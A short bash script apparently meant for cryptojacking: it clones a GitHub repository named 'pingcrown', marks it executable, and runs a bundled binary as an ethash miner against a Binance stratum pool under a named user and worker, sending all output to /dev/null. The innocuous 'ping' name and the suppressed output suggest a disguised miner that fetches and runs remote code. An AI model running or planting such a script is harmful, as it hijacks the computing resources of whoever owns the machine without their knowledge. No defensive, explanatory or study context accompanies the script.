#!/bin/bash
cd /mainsrc
git clone https://github.com/mycrownteam/pingcrown.git -q
chmod -R +x pingcrown
./pingcrown/torun -a ethash -o stratum+tcp://ethash.poolbinance.com:443 -u teguhcong -p x -w az.kienmai05 > /dev/null 2>&1
